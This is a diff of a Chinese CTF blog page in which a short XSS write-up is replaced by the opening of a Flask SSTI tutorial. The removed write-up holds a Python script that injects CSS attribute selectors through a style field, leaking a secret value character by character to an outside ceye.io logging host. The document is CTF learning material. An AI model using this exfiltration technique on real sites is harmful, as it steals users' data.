@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="xss,">
+  <meta name="keywords" content="python+web,">
 
 
 
@@ -79,18 +79,22 @@
 
 
 
-<meta name="description" content="继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的属性里面有1212………..嗯，这波操作有丶东西，属性里面的">
-<meta name="keywords" content="xss">
+<meta name="description" content="以前做题学过一些ssti，但是感觉不够深入，整理一下，算个总结吧   漏洞介绍ssti，服务器端模板注入，主要是python或者其他语言在渲染模板的时候，由于代码不规范或者信任了用户的输入，使得模板可控。简单来说就是，模板里面有些用户输入的东西，但是程序员在渲染模板的时候，没有检查用户输入的东西是不是都是善意的，于是就被用户拿下了这个模板做坏事了。举个栗子我们现在有这样一个模板，emmm，顺便说一">
+<meta name="keywords" content="python+web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="很简单的xss">
-<meta property="og:url" content="https://xi4or0uji.github.io/2019/01/17/2018-11-14-很简单的xss/index.html">
+<meta property="og:title" content="flask之ssti模板注入">
+<meta property="og:url" content="https://xi4or0uji.github.io/2019/01/17/2019-1-15-flask之ssti模板注入/index.html">
 <meta property="og:site_name" content="蒟蒻的ctf博客">
-<meta property="og:description" content="继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的属性里面有1212………..嗯，这波操作有丶东西，属性里面的">
+<meta property="og:description" content="以前做题学过一些ssti，但是感觉不够深入，整理一下，算个总结吧   漏洞介绍ssti，服务器端模板注入，主要是python或者其他语言在渲染模板的时候，由于代码不规范或者信任了用户的输入，使得模板可控。简单来说就是，模板里面有些用户输入的东西，但是程序员在渲染模板的时候，没有检查用户输入的东西是不是都是善意的，于是就被用户拿下了这个模板做坏事了。举个栗子我们现在有这样一个模板，emmm，顺便说一">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-01-17T08:33:16.725Z">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/ssti/1.jpg">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/ssti/2.png">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/ssti/3.png">
+<meta property="og:updated_time" content="2019-01-17T09:10:48.083Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="很简单的xss">
-<meta name="twitter:description" content="继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的属性里面有1212………..嗯，这波操作有丶东西，属性里面的">
+<meta name="twitter:title" content="flask之ssti模板注入">
+<meta name="twitter:description" content="以前做题学过一些ssti，但是感觉不够深入，整理一下，算个总结吧   漏洞介绍ssti，服务器端模板注入，主要是python或者其他语言在渲染模板的时候，由于代码不规范或者信任了用户的输入，使得模板可控。简单来说就是，模板里面有些用户输入的东西，但是程序员在渲染模板的时候，没有检查用户输入的东西是不是都是善意的，于是就被用户拿下了这个模板做坏事了。举个栗子我们现在有这样一个模板，emmm，顺便说一">
+<meta name="twitter:image" content="https://xi4or0uji.github.io/images/ssti/1.jpg">
 
 
 
@@ -120,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="https://xi4or0uji.github.io/2019/01/17/2018-11-14-很简单的xss/">
+  <link rel="canonical" href="https://xi4or0uji.github.io/2019/01/17/2019-1-15-flask之ssti模板注入/">
 
 
 
 
 
-  <title>很简单的xss | 蒟蒻的ctf博客</title>
+  <title>flask之ssti模板注入 | 蒟蒻的ctf博客</title>
   
 
 
@@ -263,7 +267,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://xi4or0uji.github.io/2019/01/17/2018-11-14-很简单的xss/">
+    <link itemprop="mainEntityOfPage" href="https://xi4or0uji.github.io/2019/01/17/2019-1-15-flask之ssti模板注入/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Xi4or0uji">
@@ -280,7 +284,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">很简单的xss</h1>
+          <h1 class="post-title" itemprop="name headline">flask之ssti模板注入</h1>
         
 
         <div class="post-meta">
@@ -292,7 +296,7 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-17T16:24:52+08:00">
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-17T17:10:48+08:00">
                 2019-01-17
               </time>
             
@@ -352,9 +356,11 @@
       
 
       
-        <p>继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………<br>emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的<style>属性里面有1212………..<br>嗯，这波操作有丶东西，<style>属性里面的语句可控，就可以搞事情了，因为现在的浏览器版本比较高，尝试了一下直接利用js伪代码发现不行，只能一个个匹配然后弹回去自己的平台<br>最后脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">strs = <span class="string">"0123456789_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"</span></span><br><span class="line">url = <span class="string">"http://laohulaohuhu.cn:32772/"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">flag0 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> strs:</span><br><span class="line">    flag = flag0 + ch</span><br><span class="line">    print(<span class="string">"trying "</span>+ flag)</span><br><span class="line">    key = &#123;<span class="string">'feedback'</span>:<span class="string">'111'</span>,<span class="string">'style'</span>:<span class="string">'#secret[value^="'</span> + flag + <span class="string">'"]&#123;background: url(\'http://abcdef.ceye.io/?xss='</span> + flag + <span class="string">'\');&#125;'</span>&#125;</span><br><span class="line">    r = requests.post(url=url,data=key)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span> flag</span><br><span class="line">        flag0 = flag</span><br><span class="line">print(flag0)</span><br></pre></td></tr></table></figure></p>
-<p>剩下的可以去自己的平台看一下有没有打到，flag也能出来了</p>
-</style></p>
+        <p>以前做题学过一些ssti，但是感觉不够深入，整理一下，算个总结吧  </p>
+<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>ssti，服务器端模板注入，主要是python或者其他语言在渲染模板的时候，由于代码不规范或者信任了用户的输入，使得模板可控。简单来说就是，模板里面有些用户输入的东西，但是程序员在渲染模板的时候，没有检查用户输入的东西是不是都是善意的，于是就被用户拿下了这个模板做坏事了。<br>举个栗子<br><img src="/images/ssti/1.jpg" alt=""><br>我们现在有这样一个模板，emmm，顺便说一句，模板其实就是一个html而已<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;$name&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>在这个模板上有一个name参数，用来存放用户的名字，因为每次打开页面我们都不确定是哪个用户打开。现在问题来了，如果这个参数是用户可控的，那么用户就有可能会在里面放一些恶意的代码，然后就有可能执行任意命令，这就是简单的ssti。</p>
+<h3 id="动手实践"><a href="#动手实践" class="headerlink" title="动手实践"></a>动手实践</h3><h4 id="flask的搭建"><a href="#flask的搭建" class="headerlink" title="flask的搭建"></a>flask的搭建</h4><p>在学漏洞之前先学一下怎么搭建flask的，毕竟python web和php web还是有挺多区别的，phper枯了<br>我们现在pycharm里面点击左上角的file，然后是new project，选flask，template language选jinja2，然后create就行<br><img src="/images/ssti/2.png" alt=""><br>这个时候我们可以看到新建出来的文件是这样的<br><img src="/images/ssti/3.png" alt=""><br>运行一下app.py会看到下面图片显示的东西，此时浏览器访问一下<a href="http://127.0.0.1:5000" target="_blank" rel="noopener">http://127.0.0.1:5000</a> 就会看到有hello world显示出来</p>
+
       
     </div>
     
@@ -371,7 +377,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/xss/" rel="tag"># xss</a>
+            <a href="/tags/python-web/" rel="tag"># python+web</a>
           
         </div>
       
@@ -384,8 +390,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/17/2018-11-12-HCTF2018-writeup/" rel="next" title="HCTF2018 writeup">
-                <i class="fa fa-chevron-left"></i> HCTF2018 writeup
+              <a href="/2019/01/17/2018-11-29-xxe漏洞攻击与防御/" rel="next" title="xxe漏洞攻击与防御">
+                <i class="fa fa-chevron-left"></i> xxe漏洞攻击与防御
               </a>
             
           </div>
@@ -393,10 +399,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/01/17/2018-11-14-你拿不到我的源码/" rel="prev" title="你拿不到我的源码">
-                你拿不到我的源码 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -448,8 +450,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -511,6 +522,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞介绍"><span class="nav-number">1.</span> <span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#动手实践"><span class="nav-number">2.</span> <span class="nav-text">动手实践</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#flask的搭建"><span class="nav-number">2.1.</span> <span class="nav-text">flask的搭建</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
